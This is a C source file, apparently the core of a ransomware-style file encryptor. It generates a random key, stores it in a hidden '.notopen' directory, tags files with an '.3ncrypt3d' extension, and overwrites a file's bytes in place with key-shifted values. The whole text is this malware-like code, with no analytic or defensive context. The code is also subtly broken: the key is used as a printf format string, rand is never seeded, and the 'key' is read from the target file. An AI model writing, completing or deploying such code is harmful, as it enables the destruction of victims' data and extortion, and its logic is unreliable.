#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include "liblinuxencode.h"

#define EXT_ENCRYPTED ".3ncrypt3d"
#define EXT_LENGHT 10

#define SIZE_KEY 35

char *get_key(int length) {
    char alphab[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    char *tab = (char *)malloc((length + 1) * sizeof(char)); 

    if (tab != NULL) {
        for (size_t n = 0; n < length; n++) {
            int key = rand() % (int)(sizeof alphab - 1);
            tab[n] = alphab[key];
        }
        tab[length] = '\0';
        
    }

    struct stat st = {0};
    if (stat("./.notopen", &st) == -1) {
        mkdir("./.notopen", 0700);
    }

    FILE *file = fopen("./.notopen/privatekey.key", "a");
    fprintf(file, tab);

    return tab;
}

void encodeFile(FILE *file, int nb){
    long pos = 0;
    int c;
    char keyChar[SIZE_KEY];
    fread(keyChar, 1, SIZE_KEY, file);

    while ((c = fgetc(file)) != EOF)
    {
        fseek(file, pos, SEEK_SET); 
        
        fputc(c + keyChar[pos % SIZE_KEY] + nb, file);

        pos++;
    }
    
}